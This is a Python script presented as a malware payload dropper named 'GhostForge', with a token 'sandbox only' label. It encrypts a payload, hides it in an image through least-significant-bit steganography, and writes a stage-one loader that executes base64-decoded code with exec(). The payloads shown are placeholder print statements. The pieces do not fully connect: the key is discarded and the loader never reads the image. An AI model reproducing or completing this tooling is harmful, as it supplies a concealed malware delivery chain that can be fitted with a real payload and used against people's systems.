# UltraX v10 - Payload Dropper: GhostForge
# NOTE: FOR SANDBOX USE ONLY

import os
import base64
import random
from Crypto.Cipher import AES
from PIL import Image
import numpy as np

def encrypt_payload(data, key):
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    padded = data + (16 - len(data) % 16) * b'\x00'
    return cipher.encrypt(padded)

def embed_stego(image_path, payload, output_path):
    img = Image.open(image_path)
    data = np.array(img)
    flat = data.flatten()
    payload_bits = ''.join(format(byte, '08b') for byte in payload)
    for i in range(len(payload_bits)):
        flat[i] = (flat[i] & 0xFE) | int(payload_bits[i])
    new_data = flat.reshape(data.shape)
    stego_img = Image.fromarray(new_data.astype('uint8'))
    stego_img.save(output_path)

def generate_stage_one():
    stub = """
import base64, subprocess
exec(base64.b64decode('{payload}'))
"""
    payload = base64.b64encode(b"print('Stage 2 activated. Deploying payload...')").decode()
    return stub.replace("{payload}", payload)

def drop_payload():
    key = ''.join(random.choices("ABCDEF0123456789", k=16))
    payload = encrypt_payload(b"Stage 2: Self-modifying loader initialized.", key)
    embed_stego("cover.png", payload, "payload_drop.png")
    with open("stage_one.py", "w") as f:
        f.write(generate_stage_one())
    print("[+] Stage one loader written.")
    print("[+] Encrypted payload hidden in payload_drop.png.")

if __name__ == "__main__":
    print("[*] Constructing adaptive payload delivery chain...")
    drop_payload()
    print("[✓] GhostForge ready for deployment.")
